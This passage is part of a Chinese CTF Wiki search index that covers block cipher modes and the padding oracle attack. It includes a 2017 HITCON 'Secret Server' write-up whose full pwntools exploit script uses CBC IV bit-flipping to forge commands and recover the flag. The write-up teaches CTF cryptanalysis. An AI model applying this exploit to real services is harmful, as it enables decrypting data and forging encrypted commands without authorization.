\u6700\u540e\u4e00\u4e2a\u663e\u7136\u5728\u52a0\u5bc6\u65f6\u8fdb\u884c\u4e86 padding\u3002","title":"2016 ABCTF aes-mess-75"},{"location":"crypto/blockcipher/block-cipher-mode/#_9","text":"2018 PlaidCTF macsh","title":"\u9898\u76ee"},{"location":"crypto/blockcipher/block-cipher-mode/#cbc","text":"CBC\u5168\u79f0\u4e3a\u5bc6\u7801\u5206\u7ec4\u94fe\u63a5\uff08Cipher-block chaining\uff09 \u6a21\u5f0f\uff0c\u8fd9\u91cc IV \u4e0d\u8981\u6c42\u4fdd\u5bc6 IV \u5fc5\u987b\u662f\u4e0d\u53ef\u9884\u6d4b\u7684\uff0c\u800c\u4e14\u8981\u4fdd\u8bc1\u5b8c\u6574\u6027\u3002","title":"CBC"},{"location":"crypto/blockcipher/block-cipher-mode/#_10","text":"","title":"\u52a0\u5bc6"},{"location":"crypto/blockcipher/block-cipher-mode/#_11","text":"","title":"\u89e3\u5bc6"},{"location":"crypto/blockcipher/block-cipher-mode/#_12","text":"","title":"\u4f18\u7f3a\u70b9"},{"location":"crypto/blockcipher/block-cipher-mode/#_13","text":"\u5bc6\u6587\u5757\u4e0d\u4ec5\u548c\u5f53\u524d\u5bc6\u6587\u5757\u76f8\u5173\uff0c\u800c\u4e14\u548c\u524d\u4e00\u4e2a\u5bc6\u6587\u5757\u6216 IV \u76f8\u5173\uff0c\u9690\u85cf\u4e86\u660e\u6587\u7684\u7edf\u8ba1\u7279\u6027\u3002 \u5177\u6709\u6709\u9650\u7684\u4e24\u6b65\u9519\u8bef\u4f20\u64ad\u7279\u6027\uff0c\u5373\u5bc6\u6587\u5757\u4e2d\u7684\u4e00\u4f4d\u53d8\u5316\u53ea\u4f1a\u5f71\u54cd\u5f53\u524d\u5bc6\u6587\u5757\u548c\u4e0b\u4e00\u5bc6\u6587\u5757\u3002 \u5177\u6709\u81ea\u540c\u6b65\u7279\u6027\uff0c\u5373\u7b2c k \u5757\u8d77\u5bc6\u6587\u6b63\u786e\uff0c\u5219\u7b2c k+1 \u5757\u5c31\u80fd\u6b63\u5e38\u89e3\u5bc6\u3002","title":"\u4f18\u70b9"},{"location":"crypto/blockcipher/block-cipher-mode/#_14","text":"\u52a0\u5bc6\u4e0d\u80fd\u5e76\u884c\uff0c\u89e3\u5bc6\u53ef\u4ee5\u5e76\u884c\u3002","title":"\u7f3a\u70b9"},{"location":"crypto/blockcipher/block-cipher-mode/#_15","text":"CBC \u5e94\u7528\u5341\u5206\u5e7f\u6cdb \u5e38\u89c1\u7684\u6570\u636e\u52a0\u5bc6\u548c TLS \u52a0\u5bc6\u3002 \u5b8c\u6574\u6027\u8ba4\u8bc1\u548c\u8eab\u4efd\u8ba4\u8bc1\u3002","title":"\u5e94\u7528"},{"location":"crypto/blockcipher/block-cipher-mode/#_16","text":"\u5b57\u8282\u53cd\u8f6c\u653b\u51fb IV \u5411\u91cf\uff0c\u5f71\u54cd\u7b2c\u4e00\u4e2a\u660e\u6587\u5206\u7ec4 \u7b2c n \u4e2a\u5bc6\u6587\u5206\u7ec4\uff0c\u5f71\u54cd\u7b2c n + 1 \u4e2a\u660e\u6587\u5206\u7ec4 Padding Oracle Attack\uff0c\u5177\u4f53\u53c2\u89c1\u4e0b\u9762\u4ecb\u7ecd\u3002","title":"\u653b\u51fb"},{"location":"crypto/blockcipher/block-cipher-mode/#pcbc","text":"PCBC \u7684\u5168\u79f0\u4e3a\u660e\u6587\u5bc6\u7801\u5757\u94fe\u63a5\uff08Plaintext cipher-block chaining\uff09\u3002\u4e5f\u79f0\u4e3a\u586b\u5145\u5bc6\u7801\u5757\u94fe\u63a5\uff08Propagating cipher-block chaining\uff09\u3002","title":"PCBC"},{"location":"crypto/blockcipher/block-cipher-mode/#_17","text":"","title":"\u52a0\u5bc6"},{"location":"crypto/blockcipher/block-cipher-mode/#_18","text":"","title":"\u89e3\u5bc6"},{"location":"crypto/blockcipher/block-cipher-mode/#_19","text":"\u89e3\u5bc6\u8fc7\u7a0b\u96be\u4ee5\u5e76\u884c\u5316 \u4e92\u6362\u90bb\u63a5\u7684\u5bc6\u6587\u5757\u4e0d\u4f1a\u5bf9\u540e\u9762\u7684\u5bc6\u6587\u5757\u9020\u6210\u5f71\u54cd","title":"\u7279\u70b9"},{"location":"crypto/blockcipher/block-cipher-mode/#cfb","text":"CFB \u5168\u79f0\u4e3a\u5bc6\u6587\u53cd\u9988\u6a21\u5f0f\uff08Cipher feedback\uff09\u3002","title":"CFB"},{"location":"crypto/blockcipher/block-cipher-mode/#_20","text":"","title":"\u52a0\u5bc6"},{"location":"crypto/blockcipher/block-cipher-mode/#_21","text":"","title":"\u89e3\u5bc6"},{"location":"crypto/blockcipher/block-cipher-mode/#_22","text":"","title":"\u4f18\u7f3a\u70b9"},{"location":"crypto/blockcipher/block-cipher-mode/#_23","text":"\u9002\u5e94\u4e8e\u4e0d\u540c\u6570\u636e\u683c\u5f0f\u7684\u8981\u6c42 \u6709\u9650\u9519\u8bef\u4f20\u64ad \u81ea\u540c\u6b65","title":"\u4f18\u70b9"},{"location":"crypto/blockcipher/block-cipher-mode/#_24","text":"\u52a0\u5bc6\u4e0d\u80fd\u5e76\u884c\u5316\uff0c\u89e3\u5bc6\u4e0d\u80fd\u5e76\u884c","title":"\u7f3a\u70b9"},{"location":"crypto/blockcipher/block-cipher-mode/#_25","text":"\u8be5\u6a21\u5f0f\u9002\u5e94\u4e8e\u6570\u636e\u5e93\u52a0\u5bc6\uff0c\u65e0\u7ebf\u901a\u4fe1\u52a0\u5bc6\u7b49\u5bf9\u6570\u636e\u683c\u5f0f\u6709\u7279\u6b8a\u8981\u6c42\u7684\u52a0\u5bc6\u73af\u5883\u3002","title":"\u5e94\u7528\u573a\u666f"},{"location":"crypto/blockcipher/block-cipher-mode/#_26","text":"HITCONCTF-Quals-2015-Simple-(Crypto-100)","title":"\u9898\u76ee"},{"location":"crypto/blockcipher/block-cipher-mode/#ofb","text":"OFB\u5168\u79f0\u4e3a\u8f93\u51fa\u53cd\u9988\u6a21\u5f0f\uff08Output feedback\uff09\uff0c\u5176\u53cd\u9988\u5185\u5bb9\u662f\u5206\u7ec4\u52a0\u5bc6\u540e\u7684\u5185\u5bb9\u800c\u4e0d\u662f\u5bc6\u6587\u3002","title":"OFB"},{"location":"crypto/blockcipher/block-cipher-mode/#_27","text":"","title":"\u52a0\u5bc6"},{"location":"crypto/blockcipher/block-cipher-mode/#_28","text":"","title":"\u89e3\u5bc6"},{"location":"crypto/blockcipher/block-cipher-mode/#_29","text":"","title":"\u4f18\u7f3a\u70b9"},{"location":"crypto/blockcipher/block-cipher-mode/#_30","text":"\u4e0d\u5177\u6709\u9519\u8bef\u4f20\u64ad\u7279\u6027\u3002","title":"\u4f18\u70b9"},{"location":"crypto/blockcipher/block-cipher-mode/#_31","text":"IV \u65e0\u9700\u4fdd\u5bc6\uff0c\u4f46\u662f\u5bf9\u6bcf\u4e2a\u6d88\u606f\u5fc5\u987b\u9009\u62e9\u4e0d\u540c\u7684 IV\u3002 \u4e0d\u5177\u6709\u81ea\u540c\u6b65\u80fd\u529b\u3002","title":"\u7f3a\u70b9"},{"location":"crypto/blockcipher/block-cipher-mode/#_32","text":"\u9002\u7528\u4e8e\u4e00\u4e9b\u660e\u6587\u5197\u4f59\u5ea6\u6bd4\u8f83\u5927\u7684\u573a\u666f\uff0c\u5982\u56fe\u50cf\u52a0\u5bc6\u548c\u8bed\u97f3\u52a0\u5bc6\u3002","title":"\u9002\u7528\u573a\u666f"},{"location":"crypto/blockcipher/block-cipher-mode/#ctr","text":"CTR\u5168\u79f0\u4e3a\u8ba1\u6570\u5668\u6a21\u5f0f\uff08Counter mode\uff09\uff0c\u8be5\u6a21\u5f0f\u7531 Diffe \u548c Hellman \u8bbe\u8ba1\u3002","title":"CTR"},{"location":"crypto/blockcipher/block-cipher-mode/#_33","text":"","title":"\u52a0\u5bc6"},{"location":"crypto/blockcipher/block-cipher-mode/#_34","text":"","title":"\u89e3\u5bc6"},{"location":"crypto/blockcipher/block-cipher-mode/#_35","text":"2017 star ctf ssss 2017 star ctf ssss2","title":"\u9898\u76ee"},{"location":"crypto/blockcipher/block-cipher-mode/#padding-oracle-attack","text":"","title":"Padding Oracle Attack"},{"location":"crypto/blockcipher/block-cipher-mode/#_36","text":"Padding Oracle Attack \u653b\u51fb\u4e00\u822c\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u51e0\u4e2a\u6761\u4ef6 \u52a0\u5bc6\u7b97\u6cd5 \u91c7\u7528 PKCS5 Padding \u7684\u52a0\u5bc6\u7b97\u6cd5\u3002 \u5f53\u7136\uff0c\u975e\u5bf9\u79f0\u52a0\u5bc6\u4e2d OAEP \u7684\u586b\u5145\u65b9\u5f0f\u4e5f\u6709\u53ef\u80fd\u4f1a\u53d7\u5230\u5f71\u54cd\u3002 \u5206\u7ec4\u6a21\u5f0f\u4e3a CBC \u6a21\u5f0f\u3002 \u653b\u51fb\u8005\u80fd\u529b \u653b\u51fb\u8005\u53ef\u4ee5\u62e6\u622a\u4e0a\u8ff0\u52a0\u5bc6\u7b97\u6cd5\u52a0\u5bc6\u7684\u6d88\u606f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u548c padding oracle\uff08\u5373\u670d\u52a1\u5668\uff09 \u8fdb\u884c\u4ea4\u4e92\uff1a\u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u7aef\u53d1\u9001\u5bc6\u6587\uff0c\u670d\u52a1\u5668\u7aef\u4f1a\u4ee5\u67d0\u79cd\u8fd4\u56de\u4fe1\u606f\u544a\u77e5\u5ba2\u6237\u7aef padding \u662f\u5426\u6b63\u5e38\u3002 Padding Oracle Attack \u653b\u51fb\u53ef\u4ee5\u8fbe\u5230\u7684\u6548\u679c\u5982\u4e0b \u5728\u4e0d\u6e05\u695a key \u548c IV \u7684\u524d\u63d0\u4e0b\u89e3\u5bc6\u4efb\u610f\u7ed9\u5b9a\u7684\u5bc6\u6587\u3002","title":"\u4ecb\u7ecd"},{"location":"crypto/blockcipher/block-cipher-mode/#_37","text":"Padding Oracle Attack \u653b\u51fb\u7684\u57fa\u672c\u539f\u7406\u5982\u4e0b \u5bf9\u4e8e\u5f88\u957f\u7684\u6d88\u606f\u4e00\u5757\u4e00\u5757\u89e3\u5bc6\u3002 \u5bf9\u4e8e\u6bcf\u4e00\u5757\u6d88\u606f\uff0c\u5148\u89e3\u5bc6\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u7136\u540e\u89e3\u5bc6\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u8282\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002 \u8fd9\u91cc\u6211\u4eec\u56de\u987e\u4e00\u4e0b CBC \u7684 \u52a0\u5bc6 C_i=E_K(P_i \\oplus C_{i-1})\\\\ C_0=IV C_i=E_K(P_i \\oplus C_{i-1})\\\\ C_0=IV \u89e3\u5bc6 P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV \u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u4e8e\u89e3\u5bc6\uff0c\u8fd9\u91cc\u6211\u4eec\u5e76\u4e0d\u77e5\u9053 IV \u548c key\u3002\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u5bc6\u6587\u5757\u7684\u957f\u5ea6\u4e3a n \u4e2a\u5b57\u8282\u3002 \u5047\u8bbe\u6211\u4eec\u622a\u83b7\u4e86\u5bc6\u6587 Y\uff0c\u4ee5\u83b7\u53d6\u5bc6\u6587 Y \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e3a\u4f8b\u5b50\u8fdb\u884c\u5206\u6790\u3002\u4e3a\u4e86\u83b7\u53d6 Y \u7684\u5185\u5bb9\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u4f2a\u9020\u4e00\u5757\u5bc6\u6587 F \u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u4fee\u6539 Y \u5bf9\u5e94\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u8fd9\u662f\u56e0\u4e3a\u82e5\u6211\u4eec\u6784\u9020\u5bc6\u6587 F|Y \uff0c\u90a3\u4e48\u89e3\u5bc6 Y \u65f6\u5177\u4f53\u4e3a $$ P=D_K(Y)\\oplus F $$ \u6240\u4ee5\u4fee\u6539\u5bc6\u6587 F \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282 F_{n} F_{n} \u53ef\u4ee5\u4fee\u6539 Y \u5bf9\u5e94\u7684\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u4e0b\u9762\u7ed9\u51fa\u83b7\u53d6 P \u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u8fc7\u7a0b i=0\uff0c\u8bbe\u7f6e F \u7684\u6bcf\u4e2a\u5b57\u8282\u4e3a \u968f\u673a\u5b57\u8282 \u3002 \u8bbe\u7f6e F_n=i \\oplus 0x01 F_n=i \\oplus 0x01 \u5c06 F|Y \u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u5982\u679c P \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u662f i \u7684\u8bdd\uff0c\u90a3\u4e48\u6700\u540e\u7684 padding \u5c31\u662f 0x01\uff0c\u4e0d\u4f1a\u51fa\u73b0\u9519\u8bef\u3002\u5426\u5219\uff0c\u53ea\u6709 P \u7684\u6700\u540e P_n \\oplus i \\oplus 0x01 P_n \\oplus i \\oplus 0x01 \u5b57\u8282\u90fd\u662f P_n \\oplus i \\oplus 0x01 P_n \\oplus i \\oplus 0x01 \u624d\u4e0d\u4f1a\u62a5\u9519\u3002 \u800c\u4e14\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f padding \u7684\u5b57\u8282\u53ea\u80fd\u662f 0 \u5230 n\u3002 \u56e0\u6b64\uff0c\u82e5\u60f3\u8981\u4f7f\u5f97\u5728 F \u968f\u673a\u5730\u60c5\u51b5\u4e0b\uff0c\u5e76\u4e14\u6ee1\u8db3padding \u5b57\u8282\u5927\u5c0f\u7684\u7ea6\u675f\u60c5\u51b5\u4e0b\u8fd8\u4e0d\u62a5\u9519 \u6982\u7387\u5f88\u5c0f \u3002\u6240\u4ee5\u5728\u670d\u52a1\u5668\u7aef\u4e0d\u62a5\u9519\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u6211\u4eec\u786e\u5b9e\u83b7\u53d6\u4e86\u6b63\u786e\u7684\u5b57\u8282\u3002 \u5728\u51fa\u73b0\u9519\u8bef\u7684\u60c5\u51b5\u4e0b\uff0ci=i+1\uff0c\u8df3\u8f6c\u52302\u3002 \u5f53\u83b7\u53d6\u4e86 P \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u83b7\u53d6 P \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u8282\uff0c\u6b64\u65f6\u9700\u8981\u8bbe\u7f6e F_n=P_n\\oplus 0x02 F_n=P_n\\oplus 0x02 \uff0c\u540c\u65f6\u8bbe\u7f6e F_{n-1}=i \\oplus 0x02 F_{n-1}=i \\oplus 0x02 \u53bb\u679a\u4e3e i\u3002 \u6240\u4ee5\uff0c\u7efc\u4e0a\u6240\u793a\uff0cPadding Oracle Attack \u5176\u5b9e\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u662f\u4e00\u79cd\u5177\u6709\u5f88\u5927\u6982\u7387\u6210\u529f\u7684\u653b\u51fb\u65b9\u6cd5\u3002 \u7136\u800c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f80\u5f80\u9047\u5230\u7684\u4e00\u4e9b\u73b0\u5b9e\u95ee\u9898\u5e76\u4e0d\u662f\u6807\u51c6\u7684 Padding Oracle Attack \u6a21\u5f0f\uff0c\u6211\u4eec\u5f80\u5f80\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u53d8\u5f62\u3002","title":"\u539f\u7406"},{"location":"crypto/blockcipher/block-cipher-mode/#2017-hitcon-secret-server","text":"","title":"2017 HITCON Secret Server"},{"location":"crypto/blockcipher/block-cipher-mode/#_38","text":"\u7a0b\u5e8f\u4e2d\u91c7\u7528\u7684\u52a0\u5bc6\u662f AES CBC\uff0c\u5176\u4e2d\u91c7\u7528\u7684 padding \u4e0e PKCS5 \u7c7b\u4f3c def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): return msg [: - ord ( msg [ - 1 ])] \u4f46\u662f\uff0c\u5728\u6bcf\u6b21 unpad \u65f6\u5e76\u6ca1\u6709\u8fdb\u884c\u68c0\u6d4b\uff0c\u800c\u662f\u76f4\u63a5\u8fdb\u884c unpad\u3002 \u5176\u4e2d\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6bcf\u6b21\u548c\u7528\u6237\u4ea4\u4e92\u7684\u51fd\u6570\u662f send_msg \uff0c\u63a5\u53d7\u7528\u6237\u7684\u660e\u6587\uff0c\u4f7f\u7528\u56fa\u5b9a\u7684 2jpmLoSsOlQrqyqE \u4f5c\u4e3a IV\uff0c\u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u7ed3\u679c\u8f93\u51fa\u3002 recv_msg \uff0c\u63a5\u53d7\u7528\u6237\u7684 IV \u548c\u5bc6\u6587\uff0c\u5bf9\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u8fd4\u56de\u3002\u6839\u636e\u8fd4\u56de\u7684\u7ed3\u679c\u4f1a\u6709\u4e0d\u540c\u7684\u64cd\u4f5c msg = recv_msg () . strip () if msg . startswith ( 'exit-here' ): exit ( 0 ) elif msg . startswith ( 'get-flag' ): send_msg ( flag ) elif msg . startswith ( 'get-md5' ): send_msg ( MD5 . new ( msg [ 7 :]) . digest ()) elif msg . startswith ( 'get-time' ): send_msg ( str ( time . time ())) elif msg . startswith ( 'get-sha1' ): send_msg ( SHA . new ( msg [ 8 :]) . digest ()) elif msg . startswith ( 'get-sha256' ): send_msg ( SHA256 . new ( msg [ 10 :]) . digest ()) elif msg . startswith ( 'get-hmac' ): send_msg ( HMAC . new ( msg [ 8 :]) . digest ()) else : send_msg ( 'command not found' )","title":"\u5206\u6790"},{"location":"crypto/blockcipher/block-cipher-mode/#_39","text":"\u8fd9\u91cc\u6211\u4eec\u518d\u7b80\u5355\u603b\u7ed3\u4e00\u4e0b\u6211\u4eec\u5df2\u6709\u7684\u90e8\u5206 \u52a0\u5bc6 \u52a0\u5bc6\u65f6\u7684 IV \u662f\u56fa\u5b9a\u7684\u800c\u4e14\u5df2\u77e5\u3002 'Welcome!!' \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002 \u89e3\u5bc6 \u6211\u4eec\u53ef\u4ee5\u63a7\u5236 IV\u3002 \u9996\u5148\uff0c\u65e2\u7136\u6211\u4eec\u77e5\u9053 Welcome!! \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u8fd8\u53ef\u4ee5\u63a7\u5236 recv_msg \u4e2d\u7684 IV\uff0c\u90a3\u4e48\u6839\u636e\u89e3\u5bc6\u8fc7\u7a0b P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV \u5982\u679c\u6211\u4eec\u5c06 Welcome!! \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u8f93\u5165\u7ed9 recv_msg\uff0c\u90a3\u4e48\u76f4\u63a5\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u4fbf\u662f \uff08Welcome!!+'\\x07'*7) xor iv \uff0c\u5982\u679c\u6211\u4eec \u6070\u5f53\u7684\u63a7\u5236\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\u4f20\u9012\u7684 iv \uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u6267\u884c \u4e0a\u8ff0\u6240\u8bf4\u7684\u4efb\u610f\u547d\u4ee4 \u3002\u4ece\u800c\uff0c\u6211\u4eec\u4e5f\u5c31\u53ef\u4ee5\u77e5\u9053 flag \u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u3002 \u5176\u6b21\uff0c\u5728\u4e0a\u9762\u7684\u57fa\u7840\u4e4b\u4e0a\uff0c\u5982\u679c\u6211\u4eec\u5728\u4efb\u4f55\u5bc6\u6587 C \u540e\u9762\u6dfb\u52a0\u81ea\u5b9a\u4e49\u7684 IV \u548c Welcome \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u4f5c\u4e3a\u8f93\u5165\u4f20\u9012\u7ed9 recv_msg\uff0c\u90a3\u4e48\u6211\u4eec\u4fbf\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u4e4b\u540e\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c \u90a3\u4e48\u7531\u4e8e unpad \u64cd\u4f5c\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u7684\u957f\u5ea6\u51cf\u5c0f 0 \u5230 255 \u3002","title":"\u4e3b\u8981\u6f0f\u6d1e"},{"location":"crypto/blockcipher/block-cipher-mode/#_40","text":"\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u7ed5\u8fc7 proof of work \u6839\u636e\u6267\u884c\u4efb\u610f\u547d\u4ee4\u7684\u65b9\u5f0f\u83b7\u53d6\u52a0\u5bc6\u540e\u7684 flag\u3002 \u7531\u4e8e flag \u7684\u5f00\u5934\u662f hitcon{ \uff0c\u4e00\u5171\u67097\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6211\u4eec\u4efb\u7136\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236 iv \u6765\u4f7f\u5f97\u89e3\u5bc6\u540e\u7684\u524d 7 \u4e2a\u5b57\u8282\u4e3a\u6307\u5b9a\u5b57\u8282\u3002\u8fd9\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u5bf9\u4e8e\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u6267\u884c get-md5 \u547d\u4ee4\u3002\u800c\u6839\u636e unpad \u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u6070\u597d\u5728\u6d88\u606f\u7684\u7b2c\u51e0\u4e2a\u5b57\u8282\u5904\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f00\u59cb\u65f6\u5c06\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u4e3a hitcon{x \uff0c\u5373\u53ea\u4fdd\u7559 hitcon{ \u540e\u7684\u4e00\u4e2a\u5b57\u8282\u3002\u8fd9\u6837\u4fbf\u53ef\u4ee5\u83b7\u5f97\u5e26\u4e00\u4e2a\u5b57\u8282\u54c8\u5e0c\u540e\u7684\u52a0\u5bc6\u7ed3\u679c\u3002\u7c7b\u4f3c\u5730\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u83b7\u5f97\u5e26\u5236\u5b9a\u4e2a\u5b57\u8282\u54c8\u5e0c\u540e\u7684\u52a0\u5bc6\u7ed3\u679c\u3002 \u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u5730\u9010\u5b57\u8282\u7206\u7834\uff0c\u8ba1\u7b97\u5bf9\u5e94 md5 \uff0c\u7136\u540e\u518d\u6b21\u5229\u7528\u4efb\u610f\u547d\u4ee4\u6267\u884c\u7684\u65b9\u5f0f\uff0c\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u660e\u6587\u4e3a\u4efb\u610f\u6307\u5b9a\u547d\u4ee4\uff0c\u5982\u679c\u63a7\u5236\u4e0d\u6210\u529f\uff0c\u90a3\u8bf4\u660e\u8be5\u5b57\u8282\u4e0d\u5bf9\uff0c\u9700\u8981\u518d\u6b21\u7206\u7834\uff1b\u5982\u679c\u6b63\u786e\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u5bf9\u5e94\u7684\u547d\u4ee4\u3002 \u5177\u4f53\u4ee3\u7801\u5982\u4e0b #coding=utf-8 from pwn import * import base64 , time , random , string from Crypto.Cipher import AES from Crypto.Hash import SHA256 , MD5 #context.log_level = 'debug' if args [ 'REMOTE' ]: p = remote ( '52.193.157.19' , 9999 ) else : p = remote ( '127.0.0.1' , 7777 ) def strxor ( str1 , str2 ): return '' . join ([ chr ( ord ( c1 ) ^ ord ( c2 )) for c1 , c2 in zip ( str1 , str2 )]) def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): return msg [: - ord ( msg [ - 1 ])] # \u53bb\u6389pad def flipplain ( oldplain , newplain , iv ): \"\"\"flip oldplain to new plain, return proper iv\"\"\" return strxor ( strxor ( oldplain , newplain ), iv ) def bypassproof (): p . recvuntil ( 'SHA256(XXXX+' ) lastdata = p . recvuntil ( ')' , drop = True ) p . recvuntil ( ' == ' ) digest = p . recvuntil ( ' \\n Give me XXXX:' , drop = True ) def proof ( s ): return SHA256 . new ( s + lastdata ) . hexdigest () == digest data = pwnlib . util . iters . mbruteforce ( proof , string . ascii_letters + string . digits , 4 , method = 'fixed' ) p . sendline ( data ) p . recvuntil ( 'Done! \\n ' ) iv_encrypt = '2jpmLoSsOlQrqyqE' def getmd5enc ( i , cipher_flag , cipher_welcome ): \"\"\"return encrypt( md5( flag[7:7+i] ) )\"\"\" ## keep iv[7:] do not change, so decrypt won't change new_iv = flipplain ( \"hitcon{\" . ljust ( 16 , ' \\x00 ' ), \"get-md5\" . ljust ( 16 , ' \\x00 ' ), iv_encrypt ) payload = new_iv + cipher_flag ## calculate the proper last byte number last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), \"a\" * 15 + chr ( len ( cipher_flag ) + 16 + 16 - ( 7 + i + 1 )), iv_encrypt ) payload += last_byte_iv + cipher_welcome p . sendline ( base64 . b64encode ( payload )) return p . recvuntil ( \" \\n \" , drop = True ) def main (): bypassproof () # result of encrypted Welcome!! cipher = p . recvuntil ( ' \\n ' , drop = True ) cipher_welcome = base64 . b64decode ( cipher )[ 16 :] log . info ( \"cipher welcome is : \" + cipher_welcome ) # execute get-flag get_flag_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"get-flag\" ), iv_encrypt ) payload = base64 . b64encode ( get_flag_iv + cipher_welcome ) p . sendline ( payload ) cipher = p . recvuntil ( ' \\n ' , drop = True ) cipher_flag = base64 . b64decode ( cipher )[ 16 :] flaglen = len ( cipher_flag ) log . info ( \"cipher flag is : \" + cipher_flag ) # get command not found cipher p . sendline ( base64 . b64encode ( iv_encrypt + cipher_welcome )) cipher_notfound = p . recvuntil ( ' \\n ' , drop = True ) flag = \"\" # brute force for every byte of flag for i in range ( flaglen - 7 ): md5_indexi = getmd5enc ( i , cipher_flag , cipher_welcome ) md5_indexi = base64 . b64decode ( md5_indexi )[ 16 :] log . info ( \"get encrypt(md5(flag[7:7+i])): \" + md5_indexi ) for guess in range ( 256 ): # locally compute md5 hash guess_md5 = MD5 . new ( flag + chr ( guess )) . digest () # try to null out the md5 plaintext and execute a command payload = flipplain ( guess_md5 , 'get-time' . ljust ( 16 , ' \\x01 ' ), iv_encrypt ) payload += md5_indexi p . sendline ( base64 . b64encode ( payload )) res = p . recvuntil ( \" \\n \" , drop = True ) # if we receive the block for 'command not found', the hash was wrong if res == cipher_notfound : print 'Guess {} is wrong.' . format ( guess ) # otherwise we correctly guessed the hash and the command was executed else : print 'Found!' flag += chr ( guess ) print 'Flag so far:' , flag break if __name__ == \"__main__\" : main () \u6700\u540e\u7ed3\u679c\u5982\u4e0b Flag so far: Paddin9_15_ve3y_h4rd__!! } \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10","title":"\u5229\u7528\u601d\u8def"},{"location":"crypto/blockcipher/block-cipher-mode/#2017-hitcon-secret-server-revenge","text":"","title":"2017 HITCON Secret Server Revenge"},{"location":"crypto/blockcipher/block-cipher-mode/#_41","text":"The password of zip is the flag of \"Secret Server\"","title":"\u63cf\u8ff0"},{"location":"crypto/blockcipher/block-cipher-mode/#_42","text":"\u8fd9\u4e2a\u7a0b\u5e8f\u65f6\u63a5\u7740\u4e0a\u9762\u7684\u7a0b\u5e8f\u7ee7\u7eed\u641e\u7684\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u8fdb\u884c\u7684\u7b80\u5355\u7684\u4fee\u6539 \u52a0\u5bc6\u7b97\u6cd5\u7684 iv \u672a\u77e5\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u6839\u636e Welcome \u52a0\u5bc6\u540e\u7684\u6d88\u606f\u63a8\u7b97\u51fa\u6765\u3002 \u7a0b\u5e8f\u591a\u4e86\u4e00\u4e2a 56 \u5b57\u8282\u7684 token\u3002 \u7a0b\u5e8f\u6700\u591a\u80fd\u8fdb\u884c 340 